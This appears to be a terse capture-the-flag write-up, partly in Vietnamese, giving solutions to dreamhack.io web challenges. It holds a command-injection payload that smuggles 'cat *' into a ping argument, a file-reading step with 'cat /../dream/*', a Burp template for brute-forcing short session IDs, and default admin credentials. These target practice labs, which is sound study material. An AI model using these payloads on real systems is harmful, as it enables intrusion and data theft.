# dreamhack.io
## php7cmp4re
```
input1=7.:&inpit2=7:
```
## phpreg
```
step1: input1=dnyanyangng0310&input2=1@43319!+1+13 
step2: cat /../dream/*
```
## ex-reg-ex
```
import re
i = "drabcdde123am@xyz.com"
m = re.match(r'dr\w{5,7}e\d+am@[a-z]{3,7}\.\w+', i)
print(m)
```
## Flying Chars
- Read src for win
## simple-web-request
- Read src and request for win

![image](https://github.com/user-attachments/assets/07441982-8730-4cdc-9491-e224b34fb5e9)

![image](https://github.com/user-attachments/assets/e46ec44a-fb38-41af-b5e5-b6834625743e)

## devtools-sources
- Dont need devtools i need a penguin
```grep -r "DH{" *```
## session

- Ở đây server phân biệt người dùng này với người dùng khác qua session_id. 
- Tuy nhiên độ dài của nó khá ngắn nên chúng ta có thể bf ra được.

![image](https://github.com/user-attachments/assets/4ed8bf4a-4263-49e8-ae56-b7653d5f75f7)

- Mình sẽ dùng brup để bf:

```
GET / HTTP/1.1
Host: host3.dreamhack.games:10491
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://host3.dreamhack.games:10491/login
Accept-Encoding: gzip, deflate, br
Cookie: sessionid=§i§
Connection: keep-alive
```

![image](https://github.com/user-attachments/assets/f65d445a-37a8-4552-bcba-6c885ca35c5b)

![image](https://github.com/user-attachments/assets/b7f2f260-2c44-427b-8f80-e6d8a63472f4)

## Carve Party
- Click bằng tay đi.
```js
for(i=0; i<=10000; i++){
 $('#jack-target').trigger("click")
}
```
## web-misconf-1
- config quên xóa default password
```
user: admin
pass: admin
```
## command-injection-1
- Server chạy subprocess nhưng không kiểm tra đầu vào của input:
```
ping -c 3 "{input}"
-> input = ";cat *;echo "
-> ping -c 3 ""; cat *; echo ""
```

## 

